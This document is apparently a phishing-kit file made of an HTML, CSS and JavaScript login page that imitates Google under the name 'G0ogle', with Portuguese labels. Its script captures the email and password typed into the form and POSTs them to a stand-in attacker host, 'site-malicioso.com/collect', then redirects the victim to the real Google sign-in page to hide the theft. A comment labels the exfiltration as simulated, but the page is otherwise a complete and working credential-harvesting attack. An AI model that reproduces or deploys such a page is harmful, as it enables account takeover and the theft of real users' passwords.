# G0ogle
<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>G0ogle</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="login-box">
    <h2>G0ogle</h2>
    <form id="loginForm" action="">
      <input type="email" id="email" placeholder="E-mail" required />
      <input type="password" id="senha" placeholder="Senha" required />
      <button type="submit">Login</button>
    </form>
    <p class="warning">
      <strong>Alerta:</strong> Proteja a sua conta!
    </p>
  </div>
  <script src="script.js"></script>
</body>
</html>
<style 
body {
  font-family: Arial, sans-serif;
  background: #f1f1f1;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-box {
  background: white;
  padding: 30px;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
  width: 320px;
  text-align: center;
}

h2 {
  margin-bottom: 20px;
  font-weight: normal;
  font-family: 'Product Sans', Arial, sans-serif;
  color: #4285F4;
}

input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 4px;
  border: 1px solid #ccc;
  font-size: 16px;
}

button {
  width: 100%;
  background: #4285F4;
  color: white;
  padding: 12px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
}

button:hover {
  background: #357ae8;
}

.warning {
  font-size: 12px;
  color: red;
  margin-top: 15px;
}
</style>
const form = document.getElementById("loginForm");

form.addEventListener("submit", function(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const senha = document.getElementById("senha").value;

  // Envio dos dados para servidor do atacante (simulado)
  fetch("https://site-malicioso.com/collect", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, senha })
  })
  .then(() => {
    window.location.href = "https://accounts.google.com/signin";
  })
  .catch(() => {
    window.location.href = "https://accounts.google.com/signin";
  });
});
